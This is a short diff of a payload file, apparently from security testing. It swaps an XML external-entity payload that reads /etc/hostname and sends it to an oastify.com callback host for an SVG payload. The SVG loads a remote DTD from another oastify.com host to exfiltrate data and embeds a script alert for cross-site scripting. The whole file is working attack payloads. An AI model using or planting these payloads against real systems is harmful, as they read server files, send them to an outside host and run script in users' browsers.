@@ -1,8 +1,9 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "file:///etc/hostname" >
-<!ENTITY callhome SYSTEM "https://dr82a6m7vauw6pl8xdstrntfs6yxmxam.oastify.com/?%xxe;">
-]
->
-<foo>&callhome;</foo>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY % xxe SYSTEM "https://5pvu8ykzt2so4hj0v5qlpfr7qywpkq8f.oastify.com/xxe.dtd">
+  %xxe;
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert('XSS');</script>
+  <text>&exfil;</text>
+</svg>
